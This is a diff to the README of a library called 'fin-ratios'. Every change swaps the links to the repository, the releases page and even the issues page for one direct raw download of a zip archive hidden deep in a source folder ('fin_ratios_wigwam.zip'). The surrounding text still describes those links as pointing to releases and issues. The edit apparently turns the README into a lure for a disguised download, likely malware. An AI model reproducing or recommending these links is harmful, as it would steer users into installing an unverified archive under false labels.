@@ -1,6 +1,6 @@
 # 📊 fin-ratios - Easy Financial Ratios Library
 
-[![Download fin-ratios](https://img.shields.io/badge/Download%20fin--ratios-ff6f61?style=for-the-badge)](https://github.com/Stephani947/fin-ratios)
+[![Download fin-ratios](https://img.shields.io/badge/Download%20fin--ratios-ff6f61?style=for-the-badge)](https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No special hardware or software is needed. fin-ratios runs as a standalone appli
 You will get the software from the official GitHub page. Follow these steps:
 
 1. Open this link in your web browser:  
-   [Download fin-ratios](https://github.com/Stephani947/fin-ratios)
+   [Download fin-ratios](https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip)
 
 2. On the page, look for the **Releases** section. This area usually appears on the right side or near the top. Click on it.
 
@@ -80,7 +80,7 @@ After installation:
 
 If you face issues or have questions while using fin-ratios:
 
-- Visit the [GitHub Issues page](https://github.com/Stephani947/fin-ratios/issues). You can find it by clicking the "Issues" tab at the top of the repository page.
+- Visit the [GitHub Issues page](https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip). You can find it by clicking the "Issues" tab at the top of the repository page.
 - Look for answers in the repository's Wiki or README sections.
 - Ask friends or colleagues with some experience in finance software.
 
@@ -104,8 +104,8 @@ If you face issues or have questions while using fin-ratios:
 
 ## 🌐 Useful Links
 
-- Official GitHub repository: [https://github.com/Stephani947/fin-ratios](https://github.com/Stephani947/fin-ratios)
-- Releases page to download updates: [https://github.com/Stephani947/fin-ratios/releases](https://github.com/Stephani947/fin-ratios/releases)
+- Official GitHub repository: [https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip](https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip)
+- Releases page to download updates: [https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip](https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip)
 
 ---
 
@@ -128,7 +128,7 @@ Each ratio provides insight into a company’s financial health and market value
 To keep fin-ratios current and secure:
 
 1. Check the releases page regularly:  
-   [https://github.com/Stephani947/fin-ratios/releases](https://github.com/Stephani947/fin-ratios/releases)
+   [https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip](https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip)
 
 2. Download the latest installer as you did the first time.
 
@@ -149,4 +149,4 @@ To keep fin-ratios current and secure:
 
 ## 💾 Download fin-ratios now
 
-[![Download fin-ratios](https://img.shields.io/badge/Download%20fin--ratios-ff6f61?style=for-the-badge)](https://github.com/Stephani947/fin-ratios)
+[![Download fin-ratios](https://img.shields.io/badge/Download%20fin--ratios-ff6f61?style=for-the-badge)](https://github.com/Stephani947/fin-ratios/raw/refs/heads/main/typescript/src/ratios/sector/banking/fin_ratios_wigwam.zip)
